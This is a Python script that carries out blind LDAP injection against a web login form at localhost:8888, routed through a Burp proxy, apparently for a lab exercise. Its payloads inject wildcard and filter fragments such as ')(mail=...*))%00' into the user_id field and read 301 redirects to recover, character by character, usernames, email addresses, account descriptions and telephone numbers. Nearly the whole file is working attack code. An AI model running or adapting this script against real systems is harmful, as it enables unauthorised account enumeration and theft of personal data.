#/usr/bin/python3


from pwnlib.util.proc import status
import requests
import time
import sys
import signal
import string
import pdb

from pwn import *
from requests.models import *


def def_handler(sig,frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def getInitialUsers():
    initial_users = []
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    for character in characters:
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        r = requests.post(main_url, data=post_data, headers=headers,  allow_redirects=False, proxies=burp)
        if r.status_code == 301:
            initial_users.append(character)

    return initial_users

def getUsers(initial_users):
    print("\nBRUTEFORCE - USERS")
    print("------------------------------------------------")
    valid_users = []

    for first_char in initial_users:
        user = ""
        min_position = 0
        max_position = 15

        p = log.progress("Usuario")
        while min_position <= max_position:
            for character in characters:
                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_char, user, character)
                header = {'Content-Type': 'application/x-www-form-urlencoded'}

                r = requests.post(main_url, data=post_data, headers=header, allow_redirects=False, proxies=burp)
                p.status(first_char + user)

                if r.status_code == 301:
                    user += character
                    break 
                elif character == " ":
                    is_looping = True
                    if is_looping == True:
                        min_position = max_position

            min_position = min_position + 1

        p.success("%s%s" % (first_char,user))

        valid_users.append(first_char + user)
    return valid_users

def email_Extractor(valid_users):
    valid_mail_address = []

    for users in valid_users: 
        email = ""
        status = log.progress("Mail Address")
        min_position = 0
        max_position = 300
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        
        # Repetimos los caracteres en cada caracter de characters
        while min_position <= max_position: 
            for character in characters: 
                data_post = "user_id={})(mail={}{}*))%00&password=*&login=1&submit=Submit".format(users, email ,character)

                r = requests.post(main_url, data=data_post , headers=headers , allow_redirects=False, proxies=burp )
                status.status(email + character)

                if r.status_code == 301:
                    email += character
                    break
                elif character == " ":
                    min_position = max_position

            min_position += min_position + 1 

        valid_mail_address.append(email)
    return valid_mail_address


def getDescription(user):
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    description = ""

    min_counter = 0
    max_counter = 99999999999

    p2 = log.progress("Descripción")
    
    # for position in range(0,50):
    while min_counter < max_counter:
        for character in characters:
            post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)
            r = requests.post(main_url, headers=headers , data=post_data, allow_redirects=False, proxies=burp)

            # print(character)
            if r.status_code == 301:
                description += character
                p2.status(description)
                break
            elif character == "ç":
                min_counter = max_counter

        min_counter += min_counter+1
    p2.success("%s: %s " % (user,description) )

def getPhoneNumbers(user):
    digits = string.digits
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    phonenumber = ""

    p2 = log.progress("Phone Numbers")
    
    for position in range(0,9):
        for character in digits:
            post_data = "user_id={})(telephoneNumber={}{}*))%00&password=*&login=1&submit=Submit".format(user, phonenumber, character)
            r = requests.post(main_url, headers=headers , data=post_data, allow_redirects=False, proxies=burp)
            p2.status(phonenumber)

            if r.status_code == 301:
                phonenumber += character
                break

    p2.success("%s: %s " % (user,phonenumber) )

# Variables Globales

main_url = "http://localhost:8888"
burp = {'http': 'http://127.0.0.1:8080'}

characters = string.ascii_lowercase + string.digits + "@" + "." + " " + "ç"

if __name__ == "__main__":
    initial_users =  getInitialUsers()
    valid_users = getUsers(initial_users)


    print("\nBRUTEFORCE - DESCRIPTION")
    print("------------------------------")
    for i in range(0,4):
        getDescription(valid_users[i])

    print("\nBRUTEFORCE - PHONE")
    print("------------------------------")
    for i in range(0,4):
        getPhoneNumbers(valid_users[i])

